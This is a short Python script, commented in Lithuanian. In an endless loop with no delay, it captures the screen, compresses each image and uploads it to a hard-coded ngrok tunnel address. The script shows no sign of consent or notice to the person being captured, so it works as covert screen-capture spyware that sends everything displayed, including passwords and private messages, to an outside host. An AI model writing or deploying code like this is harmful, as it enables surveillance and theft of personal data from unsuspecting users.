import pyautogui
import requests
from io import BytesIO

SERVER_URL = "https://d5bfbba091c4.ngrok-free.app/upload"

def send_screenshot():
    screenshot = pyautogui.screenshot()
    # sumažinam ekrano vaizdą perpus
    screenshot = screenshot.resize((screenshot.width // 2, screenshot.height // 2))
    buffer = BytesIO()
    screenshot.save(buffer, format='JPEG', quality=60)  # JPG mažesnis + greitesnis
    buffer.seek(0)
    files = {'screenshot': ('screenshot.jpg', buffer, 'image/jpeg')}
    try:
        response = requests.post(SERVER_URL, files=files, timeout=1)
        print(f"[+] Atsakymas: {response.status_code}")
    except Exception as e:
        print(f"[-] Klaida: {e}")

while True:
    send_screenshot()
    # čia nenaudojam sleep, kad siųstų max greičiu
